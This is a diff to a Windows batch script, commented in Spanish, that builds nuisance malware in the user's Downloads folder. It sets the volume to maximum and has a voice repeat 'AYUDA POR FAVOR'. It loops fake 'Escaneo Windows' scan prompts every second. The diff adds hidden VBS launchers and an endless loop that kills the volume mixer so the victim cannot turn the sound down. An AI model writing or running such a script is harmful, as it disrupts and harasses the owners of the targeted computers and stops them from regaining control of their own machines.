@@ -25,18 +25,24 @@ echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\Downloads\carpet
 echo David.Rate = 2 >> %userprofile%\Downloads\carpeta\voice.vbs 
 echo David.Volume = 100 >> %userprofile%\Downloads\carpeta\voice.vbs 
 echo David.Speak "AYUDA POR FAVOR, AYUDA POR FAVOR, AYUDA POR FAVOR, " >> %userprofile%\Downloads\carpeta\voice.vbs
-rem Creacion de alerta de aviso
+rem ALERTA DE AVISOS avisos.vbs 
 echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") >> %userprofile%\Downloads\carpeta\avisos.vbs 
-rem Creacion del bucle de avisos
+rem bucle.bat de avisos.vbs
 echo :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
 echo start %userprofile%\Downloads\carpeta\avisos.vbs  >> %userprofile%\Downloads\carpeta\bucle.bat
-echo taskkill /im SndVol.exe >> %userprofile%\Downloads\carpeta\bucle.bat
 echo timeout 1  >> %userprofile%\Downloads\carpeta\bucle.bat 
 echo goto :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
+rem BUCLE VBS DE AVISOS ocultobucle.vbs
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\bucle.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobucle.vbs
+rem BUCLE DE TASKKILL buclekill.bat
+echo :in > %userprofile%\Downloads\carpeta\buclekill.bat
+echo taskkill /im SndVol.exe >> %userprofile%\Downloads\carpeta\buclekill.bat
+echo goto :in >> %userprofile%\Downloads\carpeta\buclekill.bat
+rem VBS DE BUCLEKILL ocultobuclekill.vbs
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\buclekill.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobuclekill.vbs
 rem Iniciar programas
 start %userprofile%\Downloads\carpeta\volumenmaximo.vbs
 timeout 3
-rem start %userprofile%\Downloads\carpeta\bucle.bat
+start %userprofile%\Downloads\carpeta\ocultobuclekill.vbs
 start %userprofile%\Downloads\carpeta\voice.vbs
-echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\bucle.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobucle.vbs
 start %userprofile%\Downloads\carpeta\ocultobucle.vbs
